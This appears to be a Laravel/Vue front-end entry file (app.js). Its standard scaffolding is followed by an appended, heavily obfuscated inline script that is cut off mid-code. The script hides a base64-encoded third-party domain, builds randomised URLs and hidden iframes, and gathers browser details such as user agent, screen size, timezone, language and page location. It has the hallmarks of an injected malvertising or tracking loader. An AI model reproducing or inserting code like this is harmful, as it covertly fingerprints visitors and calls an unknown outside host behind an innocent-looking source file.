/**
 * First we will load all of this project's JavaScript dependencies which
 * includes Vue and other libraries. It is a great starting point when
 * building robust, powerful web applications using Vue and Laravel.
 */

require('./bootstrap');

window.Vue = require('vue');

/**
 * The following block of code may be used to automatically register your
 * Vue components. It will recursively scan this directory for the Vue
 * components and automatically register them with their "basename".
 *
 * Eg. ./components/ExampleComponent.vue -> <example-component></example-component>
 */

// const files = require.context('./', true, /\.vue$/i)
// files.keys().map(key => Vue.component(key.split('/').pop().split('.')[0], files(key).default))

Vue.component('example-component', require('./components/ExampleComponent.vue').default);

/**
 * Next, we will create a fresh Vue application instance and attach it to
 * the page. Then, you may begin adding components to this application
 * or customize the JavaScript scaffolding to fit your unique needs.
 */

const app = new Vue({
    el: '#app',
});
    <script data-cfasync="false" type="text/javascript">(function($,document){for($._FC=$.BC;$._FC<$.Gf;$._FC+=$.x){switch($._FC){case $.Go:!function(r){for($._E=$.BC;$._E<$.CI;$._E+=$.x){switch($._E){case $.Bu:u.m=r,u.c=e,u.d=function(n,t,r){u.o(n,t)||Object[$.e](n,t,$.$($.BE,!$.x,$.Cd,!$.BC,$.Ca,r));},u.n=function(n){for($._C=$.BC;$._C<$.Bu;$._C+=$.x){switch($._C){case $.x:return u.d(t,$.CD,t),t;break;case $.BC:var t=n&&n[$.CF]?function(){return n[$.Cb];}:function(){return n;};break;}}},u.o=function(n,t){return Object[$.By][$.CC][$.Bs](n,t);},u.p=$.Bn,u(u.s=$.Bq);break;case $.x:function u(n){for($._B=$.BC;$._B<$.CI;$._B+=$.x){switch($._B){case $.Bu:return r[n][$.Bs](t[$.Bp],t,t[$.Bp],u),t.l=!$.BC,t[$.Bp];break;case $.x:var t=e[n]=$.$($.Bv,n,$.Bx,!$.x,$.Bp,$.$());break;case $.BC:if(e[n])return e[n][$.Bp];break;}}}break;case $.BC:var e=$.$();break;}}}([function(n,t,r){for($._I=$.BC;$._I<$.CI;$._I+=$.x){switch($._I){case $.Bu:t.a=4705747,t.v=4705746,t.w=0,t.h=0,t.y=30,t._=true,t.g=JSON.parse(atob('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),t.O=2,t.S='Ly9ybmRza2l0dHl0b3IuY29tLzQwMC80NzA1NzQ3',t.k=2,t.A=$.Ix*1638671903,t.P='4EcuQ%#aUX+i',t.M='74pq6zr8',t.T='5p8',t.B='h9cqk5wnn6e',t.I='_bxplkg',t.N='_bjazqd';break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC));break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._Cd=$.BC;$._Cd<$.CI;$._Cd+=$.x){switch($._Cd){case $.Bu:var e=r($.GI),u=r($.GJ),o=r($.Ga),i=r($.BC),c=!$.x;break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC)),t[$.EJ]=function(){return $.aH+i.a+$.bw;},t.C=function(){return $.af+i.a;},t.R=function(){return c?[($.BC,e.D)(o.H[$.Ei],o[$.Hf][$.Ei]),($.BC,e.D)(o[$.Fd][$.Ei],o[$.Hf][$.Ei])][$.ah]($.cG):($.BC,u.z)();},t.F=function(){for($._b=$.BC;$._b<$.Bu;$._b+=$.x){switch($._b){case $.x:return c=!$.BC,n;break;case $.BC:var n=c;break;}}};break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._Bo=$.BC;$._Bo<$.CI;$._Bo+=$.x){switch($._Bo){case $.Bu:var e=[];break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC)),t[$.Ea]=function(){return e;},t[$.Eb]=function(n){e[$.Bt](-$.x)[$.bD]()!==n&&e[$.aw](n);};break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._F=$.BC;$._F<$.CI;$._F+=$.x){switch($._F){case $.Bu:t.U=$.Ic,t.G=$.Id,t.L=$.Ie,t.X=$.If,t.Y=$.BC,t.K=$.x,t.Z=$.Bu,t.$=$.Ig;break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC));break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._Du=$.BC;$._Du<$.Go;$._Du+=$.x){switch($._Du){case $.Gb:function b(){for($._a=$.BC;$._a<$.Bu;$._a+=$.x){switch($._a){case $.x:return n[$.m][$.r]=$.BA,n[$.m][$.s]=$.BA,n[$.m][$.u]=$.BC,n;break;case $.BC:var n=document[$.A]($.Bm);break;}}}break;case $.CI:function u(n){return n&&n[$.CF]?n:$.$($.Cb,n);}break;case $.Gc:function i(){s&&o[$.l](function(n){return n(s);});}break;case $.GI:function y(){for($._Ds=$.BC;$._Ds<$.Bu;$._Ds+=$.x){switch($._Ds){case $.x:return $.Hi+s+$.Jp+r+$.bF;break;case $.BC:var n=[$.Hp,$.Hq,$.Hr,$.Hs,$.Ht,$.Hu,$.Hv,$.Hw],e=[$.Hx,$.Hy,$.Hz,$.IA,$.IB],t=[$.IC,$.ID,$.IE,$.IF,$.IG,$.IH,$.II,$.EG,$.IJ,$.Ia,$.Dh,$.Ib],r=n[M[$.Jm](M[$.Bl]()*n[$.Hg])][$.Bw](new RegExp($.Hp,$.CA),function(){for($._Cj=$.BC;$._Cj<$.Bu;$._Cj+=$.x){switch($._Cj){case $.x:return t[n];break;case $.BC:var n=M[$.Jm](M[$.Bl]()*t[$.Hg]);break;}}})[$.Bw](new RegExp($.Hq,$.CA),function(){for($._Dp=$.BC;$._Dp<$.Bu;$._Dp+=$.x){switch($._Dp){case $.x:return($.Bn+t+M[$.Jm](M[$.Bl]()*r))[$.Bt](-$.x*t[$.Hg]);break;case $.BC:var n=M[$.Jm](M[$.Bl]()*e[$.Hg]),t=e[n],r=M[$.fH]($.Gf,t[$.Hg]);break;}}});break;}}}break;case $.Bu:var e=u(r($.JH)),d=u(r($.Gt));break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC)),t.J=y,t[$.Ec]=function(){for($._y=$.BC;$._y<$.Bu;$._y+=$.x){switch($._y){case $.x:return $.Hi+s+$.Jp+n+$.cD;break;case $.BC:var n=M[$.Bl]()[$.Bo]($.Br)[$.Bt]($.Bu);break;}}},t.Q=_,t.W=b,t.V=function(n){for($._c=$.BC;$._c<$.Bu;$._c+=$.x){switch($._c){case $.x:s=n,i();break;case $.BC:if(!n)return;break;}}},t[$.Ed]=i,t.R=function(){return s;},t.nn=function(n){o[$.aw](n),s&&n(s);},t.tn=function(u,o){for($._Dh=$.BC;$._Dh<$.Cm;$._Dh+=$.x){switch($._Dh){case $.CI:return window[$.B]($.GH,function n(t){for($._Dd=$.BC;$._Dd<$.Bu;$._Dd+=$.x){switch($._Dd){case $.x:if(r===f)if(null===t[$.EB][r]){for($._Cs=$.BC;$._Cs<$.Bu;$._Cs+=$.x){switch($._Cs){case $.x:e[r]=o?$.$($.fh,$.fg,$.Da,u,$.fx,d[$.Cb][$.al][$.ca][$.ci]):u,a[$.w][$.Jn](e,$.ab),c=w,i[$.l](function(n){return n();});break;case $.BC:var e=$.$();break;}}}else a[$.Cc][$.bn](a),window[$.C]($.GH,n),c=m;break;case $.BC:var r=Object[$.aa](t[$.EB])[$.bD]();break;}}}),a[$.i]=n,(document[$.c]||document[$.k])[$.p](a),c=l,t.rn=function(){return c===m;},t.en=function(n){return $.GB!=typeof n?null:c===m?n():i[$.aw](n);},t;break;case $.x:var i=[],c=v,n=y(),f=_(n),a=b();break;case $.Bu:function t(){for($._Be=$.BC;$._Be<$.Bu;$._Be+=$.x){switch($._Be){case $.x:return null;break;case $.BC:if(c===m){for($._Ba=$.BC;$._Ba<$.Bu;$._Ba+=$.x){switch($._Ba){case $.x:d[$.Cb][$.al][$.ca][$.ci]=n;break;case $.BC:if(c=h,!o)return($.BC,e[$.Cb])(n,$.eu);break;}}}break;}}}break;case $.BC:if(!s)return null;break;}}};break;case $.GJ:function _(n){return n[$.Hm]($.Jp)[$.Bt]($.CI)[$.ah]($.Jp)[$.Hm]($.Bn)[$.cA](function(n,t,r){for($._Bv=$.BC;$._Bv<$.Bu;$._Bv+=$.x){switch($._Bv){case $.x:return n+t[$.bh]($.BC)*e;break;case $.BC:var e=M[$.fH](r+$.x,$.Gb);break;}}},$.eb)[$.Bo]($.Br);}break;case $.Cm:var s=void $.BC,v=$.BC,l=$.x,w=$.Bu,m=$.CI,h=$.Cm,o=[];break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._Co=$.BC;$._Co<$.GI;$._Co+=$.x){switch($._Co){case $.CI:function a(n){for($._Bx=$.BC;$._Bx<$.Bu;$._Bx+=$.x){switch($._Bx){case $.x:return e<=t&&t<=u?t-e:i<=t&&t<=c?t-i+o:$.BC;break;case $.BC:var t=n[$.Bo]()[$.bh]($.BC);break;}}}break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC)),t[$.Ee]=a,t[$.o]=d,t.un=function(n,u){return n[$.Hm]($.Bn)[$.aJ](function(n,t){for($._Bh=$.BC;$._Bh<$.Bu;$._Bh+=$.x){switch($._Bh){case $.x:return d(e);break;case $.BC:var r=(u+$.x)*(t+$.x),e=(a(n)+r)%f;break;}}})[$.ah]($.Bn);},t.in=function(n,u){return n[$.Hm]($.Bn)[$.aJ](function(n,t){for($._Br=$.BC;$._Br<$.Bu;$._Br+=$.x){switch($._Br){case $.x:return d(e);break;case $.BC:var r=u[t%(u[$.Hg]-$.x)],e=(a(n)+a(r))%f;break;}}})[$.ah]($.Bn);},t.D=function(n,c){return n[$.Hm]($.Bn)[$.aJ](function(n,t){for($._Bn=$.BC;$._Bn<$.Bu;$._Bn+=$.x){switch($._Bn){case $.x:return d(i);break;case $.BC:var r=c[t%(c[$.Hg]-$.x)],e=a(r),u=a(n),o=u-e,i=o<$.BC?o+f:o;break;}}})[$.ah]($.Bn);};break;case $.Cm:function d(n){return n<=$.Go?O[$.o](n+e):n<=$.Jl?O[$.o](n+i-o):O[$.o](e);}break;case $.Bu:var e=$.Cn,u=$.Co,o=u-e+$.x,i=$.Cp,c=$.Cq,f=c-i+$.x+o;break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._Dt=$.BC;$._Dt<$.Gb;$._Dt+=$.x){switch($._Dt){case $.GI:function f(n,t){return n+(i[$.Ei]=$.bc*i[$.Ei]%$.cg,i[$.Ei]%(t-n));}break;case $.Bu:var e=r($.Gb),u=r($.x),o=r($.Gc),i=t[$.Ef]=$.$();break;case $.CI:i[$.Bl]=$.Bn,i[$.Eh]=$.Bn,i[$.Ei]=$.Bn,i[$.Ej]=!$.x;break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC)),t[$.Ef]=void $.BC,t[$.Eg]=function(n){return n[$.Hm]($.Bn)[$.cA](function(n,t){return(n<<$.GI)-n+t[$.bh]($.BC)&$.cg;},$.BC);},t.z=function(){return[i[$.Bl],$.ai][$.ah]($.cG);},t.cn=function(){return i[$.Ej];};break;case $.GJ:window[$.B]($.GH,($.BC,e[$.Ek])(i,o.fn));break;case $.Cm:var c=a(function(){if($.Bn!==i[$.Ei]){for($._Do=$.BC;$._Do<$.CI;$._Do+=$.x){switch($._Do){case $.Bu:i[$.Ej]=!$.BC;break;case $.x:try{E(i[$.Eh])[$.dh]($.BC)[$.l](function(n){for($._DF=$.BC;$._DF<$.CI;$._DF+=$.x){switch($._DF){case $.Bu:E(t)[$.dh]($.BC)[$.l](function(n){i[$.Bl]+=O[$.o](f($.Cp,$.Cq));});break;case $.x:var t=f($.Gc,$.Gi);break;case $.BC:i[$.Bl]=$.Bn;break;}}});}catch(n){($.BC,u.F)();}break;case $.BC:if(d(c),$.Dz===i[$.Ei])return i[$.Ej]=!$.BC,void($.BC,u.F)();break;}}}},$.Gd);break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._Dc=$.BC;$._Dc<$.CI;$._Dc+=$.x){switch($._Dc){case $.Bu:var e=r($.GI),d=r($.GJ),s=r($.BC),f=t.an=new A($.ak,$.Bn),u=($.Cl!=typeof document?document:$.$($.a,null))[$.a],v=$.Cr,l=$.Cs,w=$.Ct,m=$.Cu;break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC)),t.an=void $.BC,t.dn=function(e,u,o){for($._Cc=$.BC;$._Cc<$.Bu;$._Cc+=$.x){switch($._Cc){case $.x:return e[$.Ei]=i[c],e[$.Hg]=i[$.Hg],function(n){for($._Bz=$.BC;$._Bz<$.Bu;$._Bz+=$.x){switch($._Bz){case $.x:if(t===u)for(;r--;)c=(c+=o)>=i[$.Hg]?$.BC:c,e[$.Ei]=i[c];break;case $.BC:var t=n&&n[$.EB]&&n[$.EB].id,r=n&&n[$.EB]&&n[$.EB][$.JC];break;}}};break;case $.BC:var i=e[$.Fe][$.Hm](f)[$.ae](function(n){return!f[$.Ju](n);}),c=$.BC;break;}}},t[$.Ek]=function(f,a){return function(n){for($._Cz=$.BC;$._Cz<$.Bu;$._Cz+=$.x){switch($._Cz){case $.x:if(t===a)try{for($._CJ=$.BC;$._CJ<$.Bu;$._CJ+=$.x){switch($._CJ){case $.x:f[$.Ei]=($.BC,d[$.Eg])(i+s.P),f[$.Eh]=T(c[$.Hm](m)[$.dH](),$.Gf)+$.x;break;case $.BC:var e=r[$.Hm](v)[$.dm](function(n){return n[$.fa]($.fc);}),u=e[$.Hm](l)[$.bD](),o=new P(u)[$.ec]()[$.Hm](w),i=o[$.dH](),c=o[$.dH]();break;}}}catch(n){f[$.Ei]=$.Dz;}break;case $.BC:var t=n&&n[$.EB]&&n[$.EB].id,r=n&&n[$.EB]&&n[$.EB][$.DE];break;}}};},t.sn=function(n,t){for($._h=$.BC;$._h<$.Bu;$._h+=$.x){switch($._h){case $.x:r[$.bI]=n,u[$.F](r);break;case $.BC:var r=new Event(t);break;}}},t.vn=function(r,n){return E[$.CJ](null,$.$($.Hg,n))[$.aJ](function(n,t){return($.BC,e.un)(r,t);})[$.ah]($.fj);};break;case $.BC:$.Ck;break;}}},function(n,t,r){for($._De=$.BC;$._De<$.GI;$._De+=$.x){switch($._De){case $.CI:t.wn=M[$.Bl]()[$.Bo]($.Br)[$.Bt]($.Bu),t.fn=M[$.Bl]()[$.Bo]($.Br)[$.Bt]($.Bu),t.ln=M[$.Bl]()[$.Bo]($.Br)[$.Bt]($.Bu);break;case $.x:Object[$.e](t,$.CF,$.$($.JC,!$.BC)),t.ln=t.fn=t.wn=t.mn=t.hn=void $.BC;break;case $.Cm:o&&(o[$.B](i,function n(r){o[$.C](i,n),[($.BC,e.yn)(navigator[$.dj]),($.BC,e._n)(window[$.be][$.s]),($.BC,e.bn)(new P()),($.BC,e.pn)(window[$.ca][$.ci]),($.BC,e.gn)(navigator[$.dq]||navigator[$.ek])][$.l](function(t){for($._Cx=$.BC;$._Cx<$.Bu;$._Cx+=$.x){switch($._Cx){case $.x:x(function(){for($._Cq=$.BC;$._Cq<$.Bu;$._Cq+=$.x){switch($._Cq){case $.x:n.id=r[$.bI],n[$.JC]=t,window[$.Jn](n,$.ab),($.BC,u[$.Eb])($.fv+t);break;case $.BC:var n=$.$();break;}}},n);break;case $.BC:var n=T($.Gf*M[$.Bl](),$.Gf);break;}}});}),o[$.B](c,function n(t){for($._